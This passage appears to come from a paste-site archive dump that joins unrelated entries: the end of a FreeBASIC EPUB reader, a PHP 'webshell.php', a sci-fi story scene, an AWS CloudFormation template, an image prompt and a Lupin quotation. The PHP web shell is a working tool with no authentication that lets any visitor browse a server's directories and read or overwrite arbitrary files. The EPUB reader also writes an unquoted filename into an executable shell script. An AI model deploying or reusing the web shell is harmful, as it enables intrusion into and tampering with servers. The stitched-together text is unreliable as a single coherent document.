        za.entries(i).zmethod     = cdhdr->method
        za.entries(i).zcompsize   = cdhdr->compsize
        za.entries(i).zuncompsize = cdhdr->uncompsize
        za.entries(i).zoffset     = cdhdr->offset

        cdpos += sizeof(ZipCentralHeader) + cdhdr->namelen + cdhdr->extralen + cdhdr->commentlen
    next

    return 0
end function

sub zip_close(byref za as ZipArchive)
    if za.rawbuf <> NULL_PTR then deallocate(za.rawbuf)
    za.rawbuf = NULL_PTR
    erase za.entries
end sub

' Return the index of the entry with this exact name, or -1.
function zip_find(byref za as ZipArchive, nm as string) as integer
    for i as integer = 0 to za.nentries - 1
        if za.entries(i).zname = nm then return i
    next
    return -1
end function

' Extract a named entry straight into a string's backing buffer.
' No intermediate uncompressed allocation, no copy.
function zip_extract_string(byref za as ZipArchive, nm as string) as string
    dim as integer idx = zip_find(za, nm)
    if idx < 0 then
        print ""zip_extract_string: not found: "" & nm
        return """"
    end if

    dim as ZipEntry ptr e = @za.entries(idx)

    if e->zoffset + sizeof(ZipLocalHeader) > za.rawlen then return """"
    dim as ZipLocalHeader ptr localhdr = cast(ZipLocalHeader ptr, za.rawbuf + e->zoffset)
    if localhdr->signature <> LOCAL_SIG then return """"

    dim as ulong dataoff = e->zoffset + sizeof(ZipLocalHeader) + localhdr->namelen + localhdr->extralen
    dim as ulong csize   = e->zcompsize
    if dataoff + csize > za.rawlen then
        csize = localhdr->compsize
        if dataoff + csize > za.rawlen then return """"
    end if

    dim as ulong usize = e->zuncompsize
    if usize = 0 then usize = localhdr->uncompsize
    if usize = 0 then usize = 1

    dim as string s = space(usize)
    dim as ubyte ptr out_ptr = cast(ubyte ptr, strptr(s))

    select case e->zmethod
    case 0
        dim as ulong n = iif(csize < usize, csize, usize)
        for i as ulong = 0 to n - 1
            out_ptr[i] = za.rawbuf[dataoff + i]
        next
    case 8
        dim as integer got = inflate_raw(za.rawbuf + dataoff, csize, out_ptr, usize)
        if got <> cast(integer, usize) then return """"
    case else
        return """"
    end select

    return s
end function

' =====================================================================
' Section 6: String and XML helpers
' =====================================================================

function str_lower(s as string) as string
    dim as string r = s
    for i as integer = 1 to len(r)
        dim as integer c = asc(r, i)
        if c >= asc(""A"") andalso c <= asc(""Z"") then
            mid(r, i, 1) = chr(c + 32)
        end if
    next
    return r
end function

function str_trim(s as string) as string
    dim as integer a = 1, b = len(s)
    while a <= b andalso (asc(s, a) = 32 or asc(s, a) = 9 or asc(s, a) = 10 or asc(s, a) = 13)
        a += 1
    wend
    while b >= a andalso (asc(s, b) = 32 or asc(s, b) = 9 or asc(s, b) = 10 or asc(s, b) = 13)
        b -= 1
    wend
    if b < a then return """"
    return mid(s, a, b - a + 1)
end function

' Single-pass entity decoder. One output allocation, no intermediates.
function xml_unescape(s as string) as string
    dim as string o = """"
    dim as integer i = 1
    dim as integer n = len(s)

    while i <= n
        dim as integer c = asc(s, i)
        if c = asc(""&"") then
            dim as integer j = instr(i, s, "";"")
            if j > 0 andalso j - i <= 12 then
                dim as string entity = mid(s, i + 1, j - i - 1)

                select case entity
                case ""lt""
                    o &= ""<"" : i = j + 1 : continue while
                case ""gt""
                    o &= "">"" : i = j + 1 : continue while
                case ""quot""
                    o &= """""""" : i = j + 1 : continue while
                case ""apos""
                    o &= ""'"" : i = j + 1 : continue while
                case ""amp""
                    o &= ""&"" : i = j + 1 : continue while
                end select

                if left(entity, 1) = ""#"" then
                    dim as string num = mid(entity, 2)
                    dim as integer code
                    if left(num, 1) = ""x"" orelse left(num, 1) = ""X"" then
                        code = val(""&h"" & mid(num, 2))
                    else
                        code = val(num)
                    end if
                    if code > 0 andalso code < 128 then
                        o &= chr(code)
                    else
                        o &= ""?""
                    end if
                    i = j + 1
                    continue while
                end if
            end if
            o &= ""&""
            i += 1
        else
            o &= chr(c)
            i += 1
        end if
    wend

    return o
end function

' Return the value of attrname=""..."" inside a tag string, or """".
function xml_attr(tag as string, attrname as string) as string
    dim as string lt = str_lower(tag)
    dim as string an = str_lower(attrname)
    dim as integer p = instr(lt, an & ""="")
    if p = 0 then return """"

    dim as integer q = p + len(an) + 1
    dim as string quote = mid(tag, q, 1)
    if quote <> """""""" andalso quote <> ""'"" then return """"

    dim as integer e = instr(q + 1, tag, quote)
    if e = 0 then return """"
    return mid(tag, q + 1, e - q - 1)
end function

type XmlTag
    raw        as string
    tname      as string
    attrs      as string
    inner      as string
    selfclosed as integer
end type

' Find all occurrences of <tagname ...> in s. Fills outtags() and
' returns the count. Only handles non-nested tags.
function xml_find_tags(s as string, tagname as string, outtags() as XmlTag) as integer
    dim as integer count = 0
    redim outtags(0 to 63)
    dim as string tn = str_lower(tagname)
    dim as integer i = 1

    while i <= len(s)
        dim as integer p = instr(i, s, ""<"")
        if p = 0 then exit while
        dim as integer e = instr(p, s, "">"")
        if e = 0 then exit while

        dim as string raw   = mid(s, p, e - p + 1)
        dim as string inner = mid(s, p + 1, e - p - 1)
        dim as string inner_lc = str_lower(inner)

        dim as integer space_pos = instr(inner_lc, "" "")
        dim as integer slash_pos = instr(inner_lc, ""/"")
        dim as integer cut = len(inner_lc)
        if space_pos > 0 andalso space_pos - 1 < cut then cut = space_pos - 1
        if slash_pos > 0 andalso slash_pos - 1 < cut then cut = slash_pos - 1
        if cut < 1 then cut = 1

        dim as string firstword = left(inner_lc, cut)

        if firstword = tn then
            if count > ubound(outtags) then redim preserve outtags(0 to count + 63)
            outtags(count).raw        = raw
            outtags(count).tname      = firstword
            outtags(count).attrs      = mid(inner, cut + 1)
            outtags(count).selfclosed = iif(right(raw, 2) = ""/>"", 1, 0)

            if outtags(count).selfclosed = 0 then
                dim as integer cp = instr(e, s, ""</"" & tagname & "">"")
                if cp = 0 then cp = instr(e, s, ""</"" & ucase(tagname) & "">"")
                if cp > 0 then
                    outtags(count).inner = mid(s, e + 1, cp - e - 1)
                end if
            end if
            count += 1
        end if

        i = e + 1
    wend

    return count
end function

' =====================================================================
' Section 7: EPUB structure (OPF, spine, TOC)
' =====================================================================

type SpineItem
    idref     as string
    href      as string
    mediatype as string
end type

type TocEntry
    label as string
    href  as string
end type

type Epub
    za       as ZipArchive
    opfpath  as string
    opfdir   as string
    title    as string
    author   as string
    spine(any) as SpineItem
    nspine   as integer
    toc(any)   as TocEntry
    ntoc     as integer
end type

' Join a relative path against a base directory, normalizing ./ and ../.
function path_join(basedir as string, rel as string) as string
    if rel = """" then return basedir
    if left(rel, 1) = ""/"" then return mid(rel, 2)

    dim as string b = basedir
    if b <> """" andalso right(b, 1) <> ""/"" then b &= ""/""
    dim as string r = b & rel

    dim as string parts(0 to 255)
    dim as integer np = 0
    dim as integer i = 1
    while i <= len(r)
        dim as integer j = i
        while j <= len(r) andalso mid(r, j, 1) <> ""/""
            j += 1
        wend
        dim as string seg = mid(r, i, j - i)
        if seg = "".."" then
            if np > 0 then np -= 1
        elseif seg <> """" andalso seg <> ""."" then
            parts(np) = seg
            np += 1
        end if
        i = j + 1
    wend

    dim as string o = """"
    for k as integer = 0 to np - 1
        if k > 0 then o &= ""/""
        o &= parts(k)
    next
    return o
end function

function dir_of(p as string) as string
    for i as integer = len(p) to 1 step -1
        if mid(p, i, 1) = ""/"" then return left(p, i - 1)
    next
    return """"
end function

' Parse container.xml, the OPF, and either NCX or nav.xhtml.
' Returns 0 on success, -1 on failure.
function epub_load(byref ep as Epub, filename as string) as integer
    if zip_open(ep.za, filename) <> 0 then return -1

    dim as string cont = zip_extract_string(ep.za, ""META-INF/container.xml"")
    if cont = """" then
        print ""epub_load: cannot read META-INF/container.xml""
        return -1
    end if

    dim as XmlTag roots()
    dim as integer n = xml_find_tags(cont, ""rootfile"", roots())
    if n = 0 then
        print ""epub_load: no rootfile in container.xml""
        return -1
    end if

    dim as string fullpath = xml_attr(roots(0).raw, ""full-path"")
    if fullpath = """" then
        print ""epub_load: rootfile has no full-path""
        return -1
    end if

    ep.opfpath = fullpath
    ep.opfdir  = dir_of(fullpath)

    dim as string opf = zip_extract_string(ep.za, fullpath)
    if opf = """" then
        print ""epub_load: cannot read opf""
        return -1
    end if

    ' Metadata
    dim as XmlTag tags()
    dim as integer c = xml_find_tags(opf, ""title"", tags())
    if c > 0 then ep.title = xml_unescape(str_trim(tags(0).inner))
    c = xml_find_tags(opf, ""creator"", tags())
    if c > 0 then ep.author = xml_unescape(str_trim(tags(0).inner))

    ' Manifest: collect id -> href, media-type
    dim as string manifest_ids(0 to MAX_MANIFEST)
    dim as string manifest_hrefs(0 to MAX_MANIFEST)
    dim as string manifest_types(0 to MAX_MANIFEST)
    dim as integer nman = 0

    c = xml_find_tags(opf, ""item"", tags())
    for i as integer = 0 to c - 1
        dim as string id_ = xml_attr(tags(i).raw, ""id"")
        dim as string hr  = xml_attr(tags(i).raw, ""href"")
        dim as string mt  = xml_attr(tags(i).raw, ""media-type"")
        if id_ <> """" andalso nman <= MAX_MANIFEST then
            manifest_ids(nman)   = id_
            manifest_hrefs(nman) = hr
            manifest_types(nman) = mt
            nman += 1
        end if
    next

    ' Spine: resolve each itemref to a manifest href
    c = xml_find_tags(opf, ""itemref"", tags())
    redim ep.spine(0 to iif(c > 0, c - 1, 0))
    ep.nspine = 0
    for i as integer = 0 to c - 1
        dim as string idref = xml_attr(tags(i).raw, ""idref"")
        if idref = """" then continue for
        for j as integer = 0 to nman - 1
            if manifest_ids(j) = idref then
                ep.spine(ep.nspine).idref     = idref
                ep.spine(ep.nspine).href      = path_join(ep.opfdir, manifest_hrefs(j))
                ep.spine(ep.nspine).mediatype = manifest_types(j)
                ep.nspine += 1
                exit for
            end if
        next
    next

    ' Locate NCX and/or nav.xhtml
    dim as string ncxpath = """"
    dim as string navpath = """"
    for j as integer = 0 to nman - 1
        if manifest_types(j) = ""application/x-dtbncx+xml"" then
            ncxpath = path_join(ep.opfdir, manifest_hrefs(j))
        end if
        if manifest_types(j) = ""application/xhtml+xml"" andalso _
           instr(lcase(manifest_hrefs(j)), ""nav"") > 0 then
            navpath = path_join(ep.opfdir, manifest_hrefs(j))
        end if
    next

    dim as integer ntoc = 0
    redim ep.toc(0 to MAX_TOC)

    ' Prefer NCX.
    if ncxpath <> """" then
        dim as string ncx = zip_extract_string(ep.za, ncxpath)
        if ncx <> """" then
            dim as XmlTag navs()
            dim as integer nn = xml_find_tags(ncx, ""navPoint"", navs())
            for i as integer = 0 to nn - 1
                dim as XmlTag lbls()
                dim as integer nl = xml_find_tags(navs(i).inner, ""text"", lbls())
                dim as XmlTag cts()
                dim as integer nc = xml_find_tags(navs(i).inner, ""content"", cts())
                if nl > 0 andalso nc > 0 then
                    if ntoc > ubound(ep.toc) then redim preserve ep.toc(0 to ntoc + MAX_TOC)
                    ep.toc(ntoc).label = xml_unescape(str_trim(lbls(0).inner))
                    ep.toc(ntoc).href  = xml_attr(cts(0).raw, ""src"")
                    ntoc += 1
                end if
            next
        end if
    end if

    ' Fall back to nav.xhtml anchors.
    if ntoc = 0 andalso navpath <> """" then
        dim as string nav = zip_extract_string(ep.za, navpath)
        if nav <> """" then
            dim as XmlTag as_()
            dim as integer na = xml_find_tags(nav, ""a"", as_())
            for i as integer = 0 to na - 1
                dim as string hr = xml_attr(as_(i).raw, ""href"")
                if hr <> """" then
                    if ntoc > ubound(ep.toc) then redim preserve ep.toc(0 to ntoc + MAX_TOC)
                    ep.toc(ntoc).label = xml_unescape(str_trim(as_(i).inner))
                    ep.toc(ntoc).href  = hr
                    ntoc += 1
                end if
            next
        end if
    end if

    ep.ntoc = ntoc
    return 0
end function

sub epub_close(byref ep as Epub)
    zip_close(ep.za)
    erase ep.spine
    erase ep.toc
end sub

' =====================================================================
' Section 8: HTML to plain text
' =====================================================================

' Strip tags, decode entities, and insert newlines for block-level tags.
function html_to_text(h as string) as string
    dim as string txt = """"
    dim as integer i = 1
    dim as integer n = len(h)

    while i <= n
        dim as integer lt = instr(i, h, ""<"")
        if lt = 0 then
            txt &= xml_unescape(mid(h, i))
            exit while
        end if
        if lt > i then txt &= xml_unescape(mid(h, i, lt - i))

        dim as integer gt = instr(lt, h, "">"")
        if gt = 0 then
            txt &= xml_unescape(mid(h, lt))
            exit while
        end if

        dim as string tag = str_lower(mid(h, lt + 1, gt - lt - 1))
        dim as integer space_pos = instr(tag, "" "")
        dim as integer slash_pos = instr(tag, ""/"")
        dim as integer cut = len(tag)
        if space_pos > 0 andalso space_pos - 1 < cut then cut = space_pos - 1
        if slash_pos > 0 andalso slash_pos - 1 < cut then cut = slash_pos - 1
        if cut < 1 then cut = 1

        dim as string nm = left(tag, cut)
        if left(nm, 1) = ""/"" then nm = mid(nm, 2)

        select case nm
        case ""br"", ""p"", ""div"", ""li"", ""h1"", ""h2"", ""h3"", ""h4"", ""h5"", ""h6"", ""tr"", ""hr""
            txt &= chr(10)
        end select

        if nm = ""script"" or nm = ""style"" then
            dim as integer cp = instr(gt, h, ""</"" & nm & "">"")
            if cp = 0 then cp = instr(gt, h, ""</"" & ucase(nm) & "">"")
            if cp > 0 then
                i = cp + len(nm) + 3
                continue while
            end if
        end if

        i = gt + 1
    wend

    return txt
end function

' =====================================================================
' Section 9: Pager, word wrap, back-paging
' =====================================================================
' Page text is accumulated into a single big string (g_page_text) with
' an integer array of line-start offsets (g_page_off). This avoids the
' thousands of small string allocations that a string array would need
' on DOS, and makes page redraws cheap: slice on demand.

dim shared as integer g_page_lines    = DEFAULT_PAGE_LINES
dim shared as integer g_interactive   = -1
dim shared as integer g_wrap_cols     = DEFAULT_WRAP
dim shared as integer g_total_printed = 0
dim shared as integer g_skip_lines    = 0
dim shared as integer g_show_mode     = 0
dim shared as string  g_resume_file
dim shared as string  g_resume_idx

dim shared as string  g_page_text
dim shared as integer g_page_off(any)
dim shared as integer g_page_count = 0
dim shared as integer g_page_start = 0

' Append one wrapped line to the flat page buffer.
sub buf_append(s as string)
    if g_total_printed < g_skip_lines then
        g_total_printed += 1
        return
    end if

    if g_page_count > ubound(g_page_off) then
        dim as integer newcap = iif(g_page_count = 0, 1024, g_page_count * 2)
        redim preserve g_page_off(0 to newcap - 1)
    end if

    g_page_off(g_page_count) = len(g_page_text) + 1
    g_page_text &= s & chr(10)
    g_page_count   += 1
    g_total_printed += 1
end sub

' Return line i (0-based) from the flat buffer.
function page_line(i as integer) as string
    if i < 0 or i >= g_page_count then return """"
    dim as integer startpos = g_page_off(i)
    dim as integer endpos = iif(i + 1 < g_page_count, g_page_off(i+1) - 1, len(g_page_text))
    if endpos < startpos then return """"
    return mid(g_page_text, startpos, endpos - startpos)
end function

' Word-wrap a single source line and append each output line.
sub wrap_and_append(s as string)
    if len(s) = 0 then
        buf_append """"
        return
    end if

    dim as integer i = 1
    dim as integer n = len(s)
    dim as string curword = """"
    dim as string curout  = """"

    while i <= n
        dim as integer c = asc(s, i)
        if c = 32 or c = 9 then
            if curword <> """" then
                if curout = """" then
                    curout = curword
                elseif len(curout) + 1 + len(curword) <= g_wrap_cols then
                    curout = curout & "" "" & curword
                else
                    buf_append curout
                    curout = curword
                end if
                curword = """"
            end if
        else
            curword &= chr(c)
        end if
        i += 1
    wend

    if curword <> """" then
        if curout = """" then
            curout = curword
        elseif len(curout) + 1 + len(curword) <= g_wrap_cols then
            curout = curout & "" "" & curword
        else
            buf_append curout
            curout = curword
        end if
    end if

    if curout <> """" then buf_append curout
end sub

sub reset_pager()
    g_page_text = """"
    erase g_page_off
    g_page_count    = 0
    g_page_start    = 0
    g_total_printed = 0
end sub

' Print the resume command for the current page top.
sub print_resume_hint()
    if g_show_mode = 0 then return
    print
    print ""to resume: epubrd "" & g_resume_file & "" show "" & g_resume_idx & "" "" & _
          str(g_skip_lines + g_page_start)
    #ifdef __FB_LINUX__
        open ""resumebk.sh"" for output as #1
        print #1, !""#!/bin/bash\n\n./epubrd "" & g_resume_file & "" show "" & g_resume_idx & "" "" & _
              str(g_skip_lines + g_page_start)
        close #1
        shell ""chmod 755 resumebk.sh""
    #elseif defined(__FB_DOS__)
        open ""resumebk.bat"" for output as #1
        print #1, ""epubrd "" & g_resume_file & "" show "" & g_resume_idx & "" "" & _
              str(g_skip_lines + g_page_start)
        close #1
    #endif
end sub

sub draw_page()
    cls
    dim as integer first = g_page_start
    dim as integer last  = g_page_start + g_page_lines - 1
    if last > g_page_count - 1 then last = g_page_count - 1
    for i as integer = first to last
        print page_line(i)
    next
end sub

sub page_loop()
    if g_interactive = 0 then
        for i as integer = g_page_start to g_page_count - 1
            print page_line(i)
        next
        return
    end if

    if g_page_count = 0 then return

    do
        draw_page()

        dim as integer shown_last = g_page_start + g_page_lines - 1
        if shown_last > g_page_count - 1 then shown_last = g_page_count - 1

        print
        print ""-- space=next  b=back  q=quit --""

        select case getkey
        case KEY_CTRL_C, KEY_Q_LOWER, KEY_Q_UPPER
            print_resume_hint()
            end 0
        case KEY_B_LOWER, KEY_B_UPPER
            if g_page_start > 0 then
                g_page_start -= g_page_lines
                if g_page_start < 0 then g_page_start = 0
            end if
        case else
            if shown_last >= g_page_count - 1 then
                print_resume_hint()
                end 0
            end if
            g_page_start = shown_last + 1
        end select
    loop
end sub

' =====================================================================
' Section 10: Main
' =====================================================================

sub show_usage()
    print ""epubrd""
    print ""usage:""
    print ""  epubrd <file.epub> meta""
    print ""  epubrd <file.epub> toc""
    print ""  epubrd <file.epub> list""
    print ""  epubrd <file.epub> show <n> [skip]""
    print
    print ""show <n> [skip]: print spine item n as text, starting at""
    print ""output line <skip> (after word wrap). Default skip is 0.""
    print
    print ""At each prompt:""
    print ""  space     next page""
    print ""  b or B    previous page""
    print ""  q or Q    quit""
    print ""  ctrl-C    quit""
    print ""On quit, prints the command to resume at the top line on screen.""
    print
    print ""Environment:""
    print ""  EPUBREAD_MAX    max epub size in bytes (default 16777216)""
    print ""  EPUBREAD_COLS   wrap width, 20..78 (default 78)""
    print ""  EPUBREAD_ROWS   terminal rows (default 25); lines/page = rows-4""
    print ""  EPUBREAD_LINES  content lines per page, overrides rows-4""
end sub

' Return argv[n], trimmed of trailing CR/LF/space that DOS may leave.
function clean_arg(n as integer) as string
    dim as string s = command(n)
    while len(s) > 0
        dim as integer c = asc(s, len(s))
        if c = 13 or c = 10 or c = 32 or c = 9 then
            s = left(s, len(s) - 1)
        else
            exit while
        end if
    wend
    return s
end function

sub read_environment()
    #ifdef __FB_DOS__
        g_interactive = -1
    #else
        g_interactive = iif(environ(""TERM"") <> """", -1, 0)
    #endif

    dim as string cols_env = environ(""EPUBREAD_COLS"")
    if cols_env = """" then cols_env = environ(""COLUMNS"")
    if cols_env <> """" then
        dim as integer c = val(cols_env)
        if c >= 20 andalso c <= DEFAULT_WRAP then g_wrap_cols = c
    end if

    dim as integer term_rows = DEFAULT_ROWS
    dim as string rows_env = environ(""EPUBREAD_ROWS"")
    if rows_env <> """" then
        dim as integer r = val(rows_env)
        if r >= 10 andalso r <= 250 then term_rows = r
    end if

    g_page_lines = term_rows - 4
    if g_page_lines < 6 then g_page_lines = 6

    dim as string lines_env = environ(""EPUBREAD_LINES"")
    if lines_env <> """" then
        dim as integer l = val(lines_env)
        if l >= 6 andalso l <= 240 then g_page_lines = l
    end if
end sub

read_environment()

dim as string filename = clean_arg(1)
dim as string cmd      = clean_arg(2)
dim as string arg      = clean_arg(3)
dim as string skip_arg = clean_arg(4)

if filename = """" then
    show_usage()
    end 1
end if

dim as Epub ep
if epub_load(ep, filename) <> 0 then
    print ""failed to open epub""
    end 1
end if

select case cmd
case ""meta""
    reset_pager()
    buf_append ""title:  "" & ep.title
    buf_append ""author: "" & ep.author
    page_loop()

case ""toc""
    reset_pager()
    if ep.ntoc = 0 then
        buf_append ""(no toc found)""
    else
        for i as integer = 0 to ep.ntoc - 1
            buf_append str(i) & ""  "" & ep.toc(i).label & ""  -> "" & ep.toc(i).href
        next
    end if
    page_loop()

case ""list""
    reset_pager()
    for i as integer = 0 to ep.nspine - 1
        buf_append str(i) & ""  "" & ep.spine(i).href & ""  ("" & ep.spine(i).mediatype & "")""
    next
    page_loop()

case ""show""
    dim as integer idx = val(arg)
    if idx < 0 or idx >= ep.nspine then
        print ""index out of range""
        epub_close(ep)
        end 1
    end if

    g_show_mode   = 1
    g_resume_file = filename
    g_resume_idx  = arg

    if skip_arg <> """" then
        dim as integer sk = val(skip_arg)
        if sk > 0 then g_skip_lines = sk
    end if

    dim as string xhtml = zip_extract_string(ep.za, ep.spine(idx).href)
    if xhtml = """" then
        print ""(could not read "" & ep.spine(idx).href & "")""
    else
        dim as string body = html_to_text(xhtml)
        reset_pager()

        dim as integer i  = 1
        dim as integer bn = len(body)
        dim as string curline = """"

        while i <= bn
            dim as integer c = asc(body, i)
            if c = 10 then
                wrap_and_append curline
                curline = """"
            else
                curline &= chr(c)
            end if
            i += 1
        wend
        if curline <> """" then wrap_and_append curline

        page_loop()
    end if

case else
    show_usage()

end select

epub_close(ep)
end 0"
ZWiRCCqY?source=archive,webshell.php,cyberking,PHP,Tuesday 22nd of September 2026 08:02:12 AM CDT,"<?php
$d = isset($_GET['d']) ? $_GET['d'] : getcwd();
$d = rtrim($d, '/');
if ($d === '') { $d = '/'; }

if (is_file($d)) {
    if (isset($_POST['save'])) {
        $ok = file_put_contents($d, $_POST['save']);
        if ($ok === false) {
            echo ""<p>write failed</p>"";
        } else {
            echo ""<p>saved ("" . $ok . "" bytes)</p>"";
        }
    }
    $content = file_get_contents($d);
    echo '<h3>' . htmlspecialchars($d) . '</h3>';
    echo '<form method=""post"">';
    echo '<textarea name=""save"" rows=""30"" cols=""120"" style=""width:100%;font-family:monospace"">'
       . htmlspecialchars($content) . '</textarea><br>';
    echo '<button type=""submit"">Save</button>';
    echo '</form>';
    exit;
}

if (!is_dir($d)) {
    echo ""<p>not found: "" . htmlspecialchars($d) . ""</p>"";
    exit;
}

echo '<h3>' . htmlspecialchars($d) . '</h3>';
echo '<ul>';
if ($d !== '/') {
    $parent = dirname($d);
    echo '<li><a href=""?d=' . urlencode($parent) . '"">..</a></li>';
}
$items = scandir($d);
foreach ($items as $f) {
    if ($f === '.' || $f === '..') { continue; }
    $p = $d . '/' . $f;
    $label = htmlspecialchars($f) . (is_dir($p) ? '/' : '');
    echo '<li><a href=""?d=' . urlencode($p) . '"">' . $label . '</a></li>';
}
echo '</ul>';"
8XRyeMU4?source=archive,[TLF 18.I] - 322 / THE BLACKWIGHT,TLF_Shyyth,text,Monday 21st of September 2026 09:15:13 PM CDT,"[LIVE TRANSMISSION: LUVONA SYSTEM, LUVONA PRIME, STRONGHOLD-CITY ""CHALKOS""]
//DATE: [Y/M/D/H] [2,863,043/10/21/11]
//LOCATION: LUVONA SYSTEM, LUVONA PRIME, STRONGHOLD-CITY ""CHALKOS""
//STATUS: NORMAL...
-Operated by: ""INHERITOR"" Raux'us Kin'los
-Station Manifest: [SUPPRESSED]
-Asset Manifest: [SUPPRESSED]

<AUDIO/VIDEO/NEURAL-FEED CONNECTING>
-Stronghold Medbay
-Personnel Registry: Kana D. [KAN], Ryquo-44 [RYQ-44]/[FORTY-FOUR], Ryquo-322 [RYQ-322]/[THREE-TWO-TWO].
<PLAYING>

	*RYQUO-322 LAID ON AN OPERATING TABLE. KANA, THE STRONGHOLD'S CHIEF OF MEDICINE WAS OVER HIM, STRUGGLING TO CHANGE HIS MANY BANDAGES...*

KAN: ""Sir, you need to hold still. These bandages are precarious...""
RYQ-322: -*Irritated*- ""It'd be better if you put me in a Hydrostasis chamber and let me heal that way.""
KAN: ""Sir, I really need you to stop moving.""
RYQ-322: ""You know what- get off me. I'll do this myself.""
KAN: ""I can't do that, sir. ""FATHER"" gave the order. Not Raux'us.""
RYQ-322: ""...Fine- Just... Be quick about it...""
[...]

	*THE MEDBAY'S MAIN DOORS OPENED, RYQUO-44 WALKED IN. HANDS CLASPED BEHIND HIS BACK. HIS EYES IMMEDIATELY LOCKED ONTO RYQUO-322.*

KAN: ""Evening, Lord-Marshal.""
RYQ-44: ""Three-two-two. You're alive.""
RYQ-322: ""No thanks to anyone in this room...""
[...]
RYQ-44: ""Kana. Leave us, please.""
KAN: ""Aye sir... Just need to get this bandage secure...""
RYQ-44: ""Do what you need to.""

	*RYQUO-322 WINCED AS THE LAST BANDAGE WENT TAUGHT.*

KAN: ""That should do it, Sirs.""
RYQ-44: ""Have a good evening, Kana.""
KAN: ""Thank you, Sir.""

	*KANA GAVE A FORMAL BOW, AND QUICKLY EXITED THROUGH THE MAIN DOORS.*

RYQ-322: ""Why are you here, Sibling?""
RYQ-44: ""Just stopping by.""

	*THREE-TWO-TWO TURNED HIS HEAD AND GLARED AT FORTY-FOUR. HIS BURNED FACE DIDN'T LEAVE ANY EMOTION TO THE IMAGINATION, EVEN THROUGH THE BANDAGES.*

RYQ-322: ""Don't use the shared consciousness excuse. You're too clever for that.""
RYQ-44: ""How right you are, Sibling. Yet I will anyway.""
[...]
RYQ-322: ""Well?""
RYQ-44: ""I saw the fires, the Vollons. I saw Hĵalmar Stronghold collapse around you. And despite all that, you are alive. How?""
[...]
RYQ-322: ""I am alive... Because of Father.""

	*THERE WAS A MOMENT OF SILENCE, LONG AND TENSE...*

RYQ-44: ""...Come again?""

	*THREE-TWO-TWO ROLLED ONTO HIS LEFT SIDE, HOLDING BACK PAINED GRUNTS AS HE FORCEFULLY PROPPED HIMSELF UP WITH THE STUB OF HIS ARM... HE PUSHED HIMSELF UPRIGHT, AND HOBBLED OFF THE OPERATING TABLE, BARELY ABLE TO STAND WITHOUT SUPPORTING HIS WEIGHT AGAINST THE TABLE'S SIDE...*

	*THREE-TWO-TWO LOOKED UP AT FORTY-FOUR, EMBERS BURNING IN HIS EYES.*

RYQ-322: ""I am alive... Because Father wouldn't let me die.""
[...]
RYQ-44: ""Is that a figure of speech?""
RYQ-322: ""...If only it were...""

	*THREE-TWO-TWO STRAIGHTENED HIS BACK, SHARP PAINED BREATHS ESCAPING HIS LUNGS. WHAT REMAINED OF HIS ARM HELD MOST OF HIS WEIGHT TO THE OPERATING TABLE.*

RYQ-44: ""...The Wraith Project.""

	*THREE-TWO-TWO NODDED ONCE. HE SLOWLY PUSHED OFF THE OPERATING TABLE, SHAMBLING OVER TO FORTY-FOUR. PAINED EFFORT IN EVERY STEP.*

RYQ-322: ""Give me a suit.""

	*FORTY-FOUR RAISED AN EYEBROW.*

RYQ-322: ""Loose me against the Vollons.""

	*THREE-TWO-TWO STOPPED AN ARMS-LENGTH FROM FORTY-FOUR, STANDING AS TALL AS HIS BROKEN BODY WOULD ALLOW. EMBERS IN HIS EYES.*

RYQ-322: ""Put me in a Blackwight."""
nKCS925b?source=archive,Cloudformation - ECS wellcome-docker,pilasguru,YAML,Monday 21st of September 2026 02:53:24 PM CDT,"AWSTemplateFormatVersion: ""2010-09-09""

Description: >
  Aplicacion Docker welcome-to-docker ejecutandose en ECS Fargate.

Parameters:
  VpcId:
    Type: AWS::EC2::VPC::Id
    Description: VPC donde se ejecutara la aplicacion

  PublicSubnetId:
    Type: AWS::EC2::Subnet::Id
    Description: Subred publica con salida a Internet

Resources:

  ECSCluster:
    Type: AWS::ECS::Cluster
    Properties:
      ClusterName: welcome-cluster

  TaskExecutionRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub ""${AWS::StackName}-execution-role""
      AssumeRolePolicyDocument:
        Version: ""2012-10-17""
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ecs-tasks.amazonaws.com
            Action:
              - sts:AssumeRole
      ManagedPolicyArns:
        - !Sub arn:${AWS::Partition}:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy

  WebSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Permite acceder a la aplicacion web
      VpcId: !Ref VpcId
      SecurityGroupIngress:
        - Description: HTTP publico para la demo
          IpProtocol: tcp
          FromPort: 80
          ToPort: 80
          CidrIp: 0.0.0.0/0
      SecurityGroupEgress:
        - IpProtocol: -1
          CidrIp: 0.0.0.0/0

  WelcomeTaskDefinition:
    Type: AWS::ECS::TaskDefinition
    Properties:
      Family: welcome-task
      RequiresCompatibilities:
        - FARGATE
      NetworkMode: awsvpc
      Cpu: ""256""
      Memory: ""512""
      ExecutionRoleArn: !GetAtt TaskExecutionRole.Arn
      ContainerDefinitions:
        - Name: welcome
          Image: docker/welcome-to-docker:latest
          Essential: true
          PortMappings:
            - ContainerPort: 80
              HostPort: 80
              Protocol: tcp

  WelcomeService:
    Type: AWS::ECS::Service
    Properties:
      ServiceName: welcome-service
      Cluster: !Ref ECSCluster
      LaunchType: FARGATE
      DesiredCount: 1
      TaskDefinition: !Ref WelcomeTaskDefinition
      NetworkConfiguration:
        AwsvpcConfiguration:
          AssignPublicIp: ENABLED
          Subnets:
            - !Ref PublicSubnetId
          SecurityGroups:
            - !Ref WebSecurityGroup

Outputs:

  ClusterName:
    Description: Nombre del cluster ECS
    Value: !Ref ECSCluster

  ServiceName:
    Description: Nombre del servicio ECS
    Value: !GetAtt WelcomeService.Name

  SecurityGroupId:
    Description: Security Group utilizado
    Value: !Ref WebSecurityGroup"
qjQtU0w0?source=archive,Gemini Ai image Logo Creation,dev22,text,Monday 21st of September 2026 07:31:16 AM CDT,create image godrej agrovet logo 186 by 74 pixel same as reference image no border matching with image color
CBq5Mdtu?source=archive,Untitled,elchoco,text,Sunday 20th of September 2026 08:33:38 AM CDT,TYUYUY
SxGuWrUK?source=archive,Identifies furniture as fake,dgl_2,text,Saturday 19th of September 2026 05:22:17 PM CDT,"Arsène Lupin, the eccentric gentleman who operates only in the chateaux and salons, and who, one night, entered the residence of Baron Schormann, but emerged empty-handed, leaving, however, his card on which he had scribbled these words: ""Arsène Lupin, gentleman-burglar, will return when the furniture is genuine.""

***

I. The Arrest of Arsène Lupin, Arsène Lupin Gentleman Burglar"
